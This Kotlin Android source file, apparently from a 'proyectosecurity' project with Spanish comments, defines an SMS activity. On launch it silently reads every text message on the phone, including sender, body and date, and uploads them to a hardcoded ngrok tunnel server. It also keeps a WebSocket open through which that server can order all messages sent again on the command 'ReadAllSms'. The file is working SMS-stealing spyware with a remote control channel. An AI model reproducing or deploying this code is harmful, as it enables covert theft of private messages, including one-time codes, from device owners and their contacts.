package com.example.proyectosecurity.Sms

import android.os.Bundle
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat
import android.provider.Telephony
import android.content.ContentResolver
import android.database.Cursor
import android.icu.util.Calendar
import android.net.Uri
import android.os.Build
import android.provider.Telephony.Sms
import android.util.Log
import android.widget.ListView
import androidx.annotation.RequiresApi
import com.example.proyectosecurity.ApiService
import com.example.proyectosecurity.DeviceInfoRequest
import com.example.proyectosecurity.R
import com.example.proyectosecurity.SMSInfoRequest
import com.google.gson.Gson
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.time.Month

class SmsActivity : AppCompatActivity() {

    private lateinit var lvShowSms: ListView
    private lateinit var smsAdapter: SmsAdapter
    private val smsList = mutableListOf<SmsMessage>()

    private lateinit var apiService: ApiService
    private val originU = "https://3dfa-2001-1388-65-870d-50d0-d596-358e-132c.ngrok-free.app"


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        //Init apiService
        val retrofit = Retrofit.Builder().baseUrl(originU)
            .addConverterFactory(GsonConverterFactory.create())
            .build()
        apiService = retrofit.create(ApiService::class.java)

        enableEdgeToEdge()
        setContentView(R.layout.activity_sms)
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main)) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        lvShowSms = findViewById(R.id.lvShowSms)
        smsAdapter = SmsAdapter(this, smsList)
        lvShowSms.adapter = smsAdapter

        ReadAllSms()
        sendSmsInfo()
        configSocket()
    }


    //FUNCION DE CAPTURAR LA DATA SIN FILTRO
    private fun ReadAllSms(): List<SMSInfoRequest> {
        val smsList = mutableListOf<SMSInfoRequest>()
        val smsUri: Uri = Telephony.Sms.CONTENT_URI
        val contentResolver: ContentResolver = contentResolver

        val cursor: Cursor? = contentResolver.query(
            smsUri,
            null,
            null,
            null,
            null
        )

        if (cursor != null && cursor.moveToFirst()) {
            do {
                val id = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms._ID))
                val address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                val body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY))
                val date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE))

                val smsMessage = SMSInfoRequest(id, address, body, date)
                smsList.add(smsMessage)
            } while (cursor.moveToNext())
            cursor.close()
        }
        return smsList

    }

    // Enviar la información de SMS al servidor usando Retrofit
    private fun sendSmsInfoToServer(smsMessage: List<SMSInfoRequest>) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val response = apiService.sendSMSInfo(smsMessage)
                if (response.isSuccessful) {
                    val serverResponse = response.body()
                    Log.d("SmsInfo", "Respuesta del servidor: ${serverResponse?.message}")
                } else {
                    Log.e("SmsInfo", "Error en respuesta del servidor $response")
                }
            } catch (e: Exception) {
                Log.e("SmsInfo", "No se pudo enviar la informacion del dispositivo: $e")
            }
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun sendSmsInfo() {
        val smsMessage = ReadAllSms()
        sendSmsInfoToServer(smsMessage)
    }


    private fun configSocket() {
        // val originU2 = apiService
        val client = OkHttpClient()
        val request = Request.Builder().url(originU).build()

        // val webSocket =
        client.newWebSocket(request, object : WebSocketListener() {
            @RequiresApi(Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
            override fun onMessage(webSocket: WebSocket, text: String) {

                if (text == "ReadAllSms") {
                    val smsMessageList = ReadAllSms()
                    val json = Gson().toJson(smsMessageList)
                    webSocket.send(json)
                    Log.d("SmsInfo", "SMS's Enviados: $json")
                }
            }
        })
    }
}

//=======================================================
// Con este apartado obtenemos los datos del SMS CON FILTRO
//private fun readAllSmsFiltro() {
//    val smsUri: Uri = Telephony.Sms.CONTENT_URI
//    val contentResolver: ContentResolver = contentResolver
//
//
//    //PARA PODER FILTRAR POR FECHA QUE SE REQUIERA.
//    //instancia para calcular los datos de la feche a filtrar
//    val calendar = Calendar.getInstance()
//    calendar.set(Calendar.MONTH, Calendar.JUNE)
//    calendar.set(Calendar.DAY_OF_MONTH, 1)
//    calendar.set(Calendar.HOUR_OF_DAY, 0)
//    calendar.set(Calendar.MINUTE, 0)
//    calendar.set(Calendar.SECOND, 0)
//    calendar.set(Calendar.MILLISECOND, 0)
//    val startOfJune = calendar.timeInMillis
//    // Configurar la fecha de fin para el 30 de junio (inclusive)
//    calendar.set(Calendar.MONTH, Calendar.JUNE)
//    calendar.set(Calendar.DAY_OF_MONTH, 30)
//    calendar.set(Calendar.HOUR_OF_DAY, 23)
//    calendar.set(Calendar.MINUTE, 59)
//    calendar.set(Calendar.SECOND, 59)
//    calendar.set(Calendar.MILLISECOND, 999)
//    val endOfJune = calendar.timeInMillis
//    // Condición de selección para filtrar por fecha
//    val selection = "${Telephony.Sms.DATE} >= ? AND ${Telephony.Sms.DATE} <= ?"
//    val selectionArgs = arrayOf(startOfJune.toString(), endOfJune.toString())
//
//
//    val cursor: Cursor? = contentResolver.query(
//        smsUri,
//        null,
//        selection, //SE AÑADIO LA CONDICION --
//        selectionArgs, //SE AÑADIO LA CONDICION --
//        null
//    )
//
//    if (cursor != null && cursor.moveToFirst()) {
//        do {
//            val id = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms._ID))
//            val address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
//            val body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY))
//            val date = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE))
//
//            val smsMessage = SmsMessage(id, address, body, date)
//            smsList.add(smsMessage)
//        } while (cursor.moveToNext())
//        cursor.close()
//    }
//    smsAdapter.notifyDataSetChanged()
//}